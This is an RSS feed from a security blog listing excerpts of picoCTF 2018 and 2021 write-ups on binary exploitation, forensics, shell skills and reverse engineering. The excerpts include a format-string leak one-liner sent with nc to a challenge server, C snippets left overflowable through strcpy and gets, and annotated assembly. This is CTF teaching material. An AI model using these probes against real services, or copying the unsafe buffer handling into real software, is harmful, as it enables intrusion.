<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pwn on Poney Island</title><link>https://0xade1.github.io/tags/pwn/</link><description>Recent content in pwn on Poney Island</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Mon, 16 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://0xade1.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>picoCTF 2021 - Binary Exploitation</title><link>https://0xade1.github.io/posts/2021/08/picoctf-2021-binary-exploitation/</link><pubDate>Mon, 16 Aug 2021 00:00:00 +0000</pubDate><guid>https://0xade1.github.io/posts/2021/08/picoctf-2021-binary-exploitation/</guid><description>Stonks There is a format-string vulnerability.
(echo 1; for i in {1..50}; do echo -n &amp;quot;%${i}\$08x&amp;quot; ; done ; echo) | nc mercury.picoctf.net 6989 There is some ASCII characters in the output, so we can convert from hex the output to read the string
We find the string but we have the wrong Endianness ocip{FTC0l_I4_t5m[..SNIP..]..}
With Cyberchef it is easy, simply click here to view the solution.
in python3, it is more tricky:</description></item><item><title>picoCTF 2018 - Binary Exploitation</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-binary-exploitation/</guid><description>buffer-overflow-0 source: vuln.c binary: vuln The below code is vulnerable to bufferoverflow as input can be bigger then the 16 bytes buffer size
void vuln(char *input){ char buf[16]; strcpy(buf, input); } ./vuln XXXXXXXXXXXXXXXXXXXX
buffer-overflow-1 source: vuln.c binary: vuln The below code is vulnerable to overflow attack because gets cannot know in advance whether the size of the user input will be bigger then BUFSIZE
void vuln(){ char buf[BUFSIZE]; gets(buf); } With radare2, we can deduct the size of the overflow without dumping a core:</description></item><item><title>picoCTF 2018 - Forensics</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-forensics/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-forensics/</guid><description>forensics-warmup-001 We download a zipfile with the command curl -Ok url. The -k switch allows to by-pass ssl certificates checking when downloading a file in TLS (with https). we first check the zipfile with the command file: it&amp;rsquo;s indeed effectively a zip so we can unzip and explore the content. Apparently there is an image, we open it with eog and we can observe the flag
curl -Ok https://&amp;lt;URL&amp;gt;/flag.zip file flag.</description></item><item><title>picoCTF 2018 - General Skills</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-general-skills/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-general-skills/</guid><description>grep-1 grep pico file net-cat nc 2018shell.picoctf.com 37721 | grep pico strings strings strings | grep pico The binary name is strings. The utility used to find the flag inside the binary has the same name string
pipe nc 2018shell.picoctf.com 44310 | grep pico grep-2 ssh 0xade1@2018shell4.picoctf.com &amp;#39;grep -r pico /problems/grep-2_3_826f886f547acb8a9c3fccb030e8168d/files/&amp;#39; aca-Shell-a ls cd secret ls rm intel* echo &amp;#39;Drop it in!&amp;#39; cd .. cd executables ls ./dontLookHere whoami cd .</description></item><item><title>picoCTF 2018 - Reverse Engineering</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-reverse-engineering/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-reverse-engineering/</guid><description>Recommended resources: Assembler tutorial Register Calling conventions common-x86-calling-conventions X86_Disassembly/Calling_Conventions Wikipedia x86_64 calling convention assembly-0 The program is called with two arguments: asm0(0xc9, 0xb0), so the stack frame looks like the following: calling convention is cdecl | adress of argument2 | ebp+12 | adress of argument1 | ebp+8 | return address | ebp+4 | old ebp | &amp;lt;--- ebp nasm code source:
.intel_syntax noprefix .bits 32 .global asm0 asm0: push ebp ;prolog mov ebp,esp ;prolog mov eax,DWORD PTR [ebp+0x8] ;eax receives 4 bytes pointing to argument1 which is the value 0xc9 mov ebx,DWORD PTR [ebp+0xc] ;ebx receives 4 bytes pointing to argument2 which is the value 0xb0 mov eax,ebx ;eax is overwritten by ebx mov esp,ebp ;epilog pop ebp ;epilog ret ;epilog mov eax, DWORD PTR [mem]: Get 32-bit value at memory address and store it in eax register: see here</description></item></channel></rss>